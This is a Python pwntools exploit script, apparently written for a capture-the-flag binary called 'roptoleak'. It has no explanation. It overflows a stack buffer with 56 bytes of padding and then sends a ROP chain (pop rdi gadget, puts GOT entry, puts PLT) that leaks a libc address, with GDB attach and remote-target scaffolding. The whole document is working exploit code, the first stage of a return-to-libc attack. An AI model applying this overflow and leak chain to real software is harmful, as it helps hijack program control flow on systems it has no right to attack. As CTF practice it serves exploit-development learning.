#!/usr/bin/python3

from pwn import *

exe = ELF('./roptoleak', checksec=False)

context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b* 0x40116D

        c
        ''')
    input()


def info(msg): return log.info(msg)
def sla(msg, data): return p.sendlineafter(msg, data)
def sa(msg, data): return p.sendafter(msg, data)
def sl(data): return p.sendline(data)
def s(data): return p.send(data)


if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)

GDB()
pop_rdi = 0x000000000040113a
puts_got = 0x404000
puts_plt = 0x401030
pa = b'a'*56 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt)
sl(pa)
p.interactive()
